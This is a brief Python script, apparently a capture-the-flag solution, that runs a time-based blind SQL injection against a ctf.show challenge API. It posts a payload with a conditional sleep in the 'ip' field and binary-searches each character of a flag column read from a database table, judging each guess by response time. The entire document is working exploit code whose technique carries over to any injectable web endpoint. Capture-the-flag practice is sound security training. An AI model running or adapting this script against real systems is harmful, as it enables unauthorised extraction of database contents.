import time

import requests

url = "http://e899f7ec-f1d5-4d94-98c8-a1ad56153717.challenge.ctf.show/api/"
flag = ''
for i in range(60):
    lenth = len(flag)
    min,max = 32,128
    while True:
        j = min+(max-min)//2
        if(min == j):
            flag +=chr(j)
            print(flag)
            break

        payload = {"ip":f"if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),{i},1))<{j},sleep(0.5),1)"
            ,'debug':0}
        start_time = time.time()
        r = requests.post(url=url,data=payload).text
        end_time = time.time()
        sub = end_time - start_time
        if(sub>=0.5):
            max = j
        else:
            min = j